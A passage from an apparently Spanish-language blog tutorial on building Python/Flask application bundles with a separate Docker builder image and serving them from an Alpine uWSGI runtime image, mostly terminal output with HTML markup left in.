&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r10 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gmp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.1.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing isl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.14.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libgomp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libatomic &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libgcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconf &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.9.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconfig &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.25-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing mpfr3 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing mpc1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libstdc++ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ca-certificates &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20160104&lt;/span&gt;-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libssh2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.7.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libcurl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.50.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;18&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;19&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing git &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.8.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;21&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl-utils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r10 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;22&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing musl-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r11&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;23&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;26&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;27&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;28&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;30&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-setuptools &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;.8.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-pip &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;34&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing py-virtualenv &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;.0.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;35&lt;/span&gt;/35&lt;span class="o"&gt;)&lt;/span&gt; Installing python-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
Executing ca-certificates-20160104-r4.trigger
OK: &lt;span class="m"&gt;169&lt;/span&gt; MiB in &lt;span class="m"&gt;44&lt;/span&gt; packages
 ---&amp;gt; 86bd30dae926
Removing intermediate container 36ab40f2fbc6
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY build.sh /
 ---&amp;gt; bb87e7021b1f
Removing intermediate container d1c160839571
Step &lt;span class="m"&gt;4&lt;/span&gt; : ENTRYPOINT sh build.sh
 ---&amp;gt; Running in ec43f4786949
 ---&amp;gt; 9887ce973fe2
Removing intermediate container ec43f4786949
Successfully built 9887ce973fe2
gerard@sirius:~/docker/autobuilder/builder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta imagen no se va a reconstruir -en principio- nunca. Las diferentes ejecuciones van a producir diferentes productos.&lt;/p&gt;
&lt;h2&gt;La imagen de runtime&lt;/h2&gt;
&lt;p&gt;Esta imagen es todavía mas fácil; se trata de un servidor de aplicaciones estándar que va a servir la aplicación siguiendo las reglas descritas mas arriba.&lt;/p&gt;
&lt;p&gt;Vamos a asumir que tenemos el &lt;em&gt;bundle&lt;/em&gt; construido y llamado &lt;em&gt;app.tar.gz&lt;/em&gt;, así que solo faltaría descomprimirlo para que quede todo en &lt;em&gt;/app&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ cat Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache uwsgi-python
ADD app.tar.gz /
COPY app.ini /app/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uwsgi&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--ini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/app/app.ini&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero que va a servir la aplicación depende de cada servidor de aplicaciones, y de momento, nos vale un sencillo. En este punto se vuelve especialmente importante respetar las convenciones del &lt;em&gt;virtualenv&lt;/em&gt; y de la localización de la aplicación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ cat app.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;plugin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /app/app/
&lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /app/env/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La hora de la release&lt;/h2&gt;
&lt;p&gt;Ha llegado el momento de hacer una &lt;em&gt;release&lt;/em&gt;; así que vamos a hacer el &lt;em&gt;bundle&lt;/em&gt; y la imagen de servicio, para luego poder servirlo. Este paso se va a repetir muy a menudo, dependiendo de la política de &lt;em&gt;releases&lt;/em&gt; de vuestra compañía. Para obtener el &lt;em&gt;bundle&lt;/em&gt;, necesitamos compilar la referencia del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker run -ti --rm -e &lt;span class="s2"&gt;&amp;quot;REPO=https://github.com/Sirtea/autobuilder.git&amp;quot;&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;REF=v1.0.0&amp;quot;&lt;/span&gt; -v /home/gerard/docker/autobuilder/runner/:/shared/ builder
Cloning into &lt;span class="s1"&gt;&amp;#39;/build&amp;#39;&lt;/span&gt;...
remote: Counting objects: &lt;span class="m"&gt;10&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/9&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Total &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;0&lt;/span&gt;
Unpacking objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/10&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
New python executable in /app/env/bin/python
Installing setuptools, pip, wheel...done.
Collecting &lt;span class="nv"&gt;click&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.6 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading click-6.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;283kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 286kB 536kB/s 
Collecting &lt;span class="nv"&gt;Flask&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11.1 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Flask-0.11.1-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;80kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 81kB 809kB/s 
Collecting &lt;span class="nv"&gt;itsdangerous&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.24 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading itsdangerous-0.24.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;46kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 51kB 724kB/s 
Collecting &lt;span class="nv"&gt;Jinja2&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.8 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Jinja2-2.8-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;263kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 266kB 861kB/s 
Collecting &lt;span class="nv"&gt;MarkupSafe&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.23 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading MarkupSafe-0.23.tar.gz
Collecting &lt;span class="nv"&gt;mongoengine&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.10.6 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading mongoengine-0.10.6.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;346kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 348kB 803kB/s 
Collecting &lt;span class="nv"&gt;pymongo&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.3.0 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;7&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading pymongo-3.3.0.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;494kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 501kB 753kB/s 
Collecting &lt;span class="nv"&gt;Werkzeug&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11.10 &lt;span class="o"&gt;(&lt;/span&gt;from -r /app/requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Downloading Werkzeug-0.11.10-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;306kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 307kB &lt;span class="m"&gt;1&lt;/span&gt;.1MB/s 
Building wheels &lt;span class="k"&gt;for&lt;/span&gt; collected packages: click, itsdangerous, MarkupSafe, mongoengine, pymongo
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; click ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/b0/6d/8c/cf5ca1146e48bc7914748bfb1dbf3a40a440b8b4f4f0d952dd
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; itsdangerous ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/fc/a8/66/24d655233c757e178d45dea2de22a04c6d92766abfb741129a
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; MarkupSafe ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/a3/fa/dc/0198eed9ad95489b8a4f45d14dd5d2aee3f8984e46862c5748
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; mongoengine ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/ae/6d/cb/4573bb9aceaed483557761df59571c6a3f108e87a80d2ba03a
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; pymongo ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/bf/f7/14/6ed22fbc276fc2d9fa7cdb2235dea8d5f154d711dfdf4bdebe
Successfully built click itsdangerous MarkupSafe mongoengine pymongo
Installing collected packages: click, MarkupSafe, Jinja2, Werkzeug, itsdangerous, Flask, pymongo, mongoengine
Successfully installed Flask-0.11.1 Jinja2-2.8 MarkupSafe-0.23 Werkzeug-0.11.10 click-6.6 itsdangerous-0.24 mongoengine-0.10.6 pymongo-3.3.0
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puesto que el &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;build.sh&lt;/em&gt; deja el fichero &lt;em&gt;.tar.gz&lt;/em&gt; en &lt;em&gt;/shared&lt;/em&gt;, y este es un volumen montado en la carpeta actual, vemos que nos aparece nuestro producto compilado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder$ tree
.
├── builder
│   ├── build.sh
│   └── Dockerfile
└── runner
    ├── app.ini
    ├── app.tar.gz
    └── Dockerfile

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;5&lt;/span&gt; files
gerard@sirius:~/docker/autobuilder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Efectivamente, este &lt;em&gt;bundle&lt;/em&gt; contiene la aplicación y el &lt;em&gt;virtualenv&lt;/em&gt; en la forma requerida, así que el siguiente paso es construir la imagen de &lt;em&gt;runtime&lt;/em&gt; con este &lt;em&gt;bundle&lt;/em&gt; incorporado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker build -t runner .
Sending build context to Docker daemon &lt;span class="m"&gt;5&lt;/span&gt;.027 MB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache uwsgi-python
 ---&amp;gt; Running in 9233d11f6646
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing mailcap &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.44-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
